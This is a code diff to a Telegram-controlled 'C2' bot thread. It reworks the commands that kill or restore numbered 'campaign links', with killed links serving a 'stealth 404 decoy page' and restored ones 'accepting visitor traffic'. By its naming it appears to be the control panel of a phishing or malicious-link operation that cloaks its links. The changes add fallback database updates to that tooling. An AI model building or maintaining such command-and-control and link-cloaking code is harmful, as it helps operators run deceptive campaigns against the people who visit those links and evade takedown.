@@ -601,11 +601,14 @@ class TelegramC2BotThread(threading.Thread):
         lid = args[0].strip()
         try:
             import deployments
-            if hasattr(deployments, 'set_deployment_status'):
-                deployments.set_deployment_status(lid, 'killed')
-                self._send_text(bot_token, chat_id, f"🚨 <b>LINK #{lid} KILLED!</b>\nTraffic will immediately receive the stealth 404 decoy page.")
+            if hasattr(deployments, 'kill_deployment'):
+                deployments.kill_deployment(int(lid))
+            elif hasattr(deployments, 'set_deployment_status'):
+                deployments.set_deployment_status(int(lid), 'killed')
             else:
-                self._send_text(bot_token, chat_id, f"⚠️ set_deployment_status method not available.")
+                with deployments._conn() as c:
+                    c.execute("UPDATE deployments SET status='killed' WHERE id=?", (int(lid),))
+            self._send_text(bot_token, chat_id, f"🚨 <b>LINK #{lid} KILLED!</b>\nTraffic will immediately receive the stealth 404 decoy page.")
         except Exception as e:
             self._send_text(bot_token, chat_id, f"⚠️ Error killing link #{lid}: {e}")
 
@@ -616,11 +619,14 @@ class TelegramC2BotThread(threading.Thread):
         lid = args[0].strip()
         try:
             import deployments
-            if hasattr(deployments, 'set_deployment_status'):
-                deployments.set_deployment_status(lid, 'active')
-                self._send_text(bot_token, chat_id, f"✓ <b>Link #{lid} Restored!</b>\nCampaign link is live and accepting visitor traffic.")
+            if hasattr(deployments, 'update_deployment'):
+                deployments.update_deployment(int(lid), {'status': 'active'})
+            elif hasattr(deployments, 'set_deployment_status'):
+                deployments.set_deployment_status(int(lid), 'active')
             else:
-                self._send_text(bot_token, chat_id, f"⚠️ set_deployment_status method not available.")
+                with deployments._conn() as c:
+                    c.execute("UPDATE deployments SET status='active' WHERE id=?", (int(lid),))
+            self._send_text(bot_token, chat_id, f"🟢 <b>LINK #{lid} RESTORED!</b>\nCampaign link is live and accepting visitor traffic.")
         except Exception as e:
             self._send_text(bot_token, chat_id, f"⚠️ Error restoring link #{lid}: {e}")
 
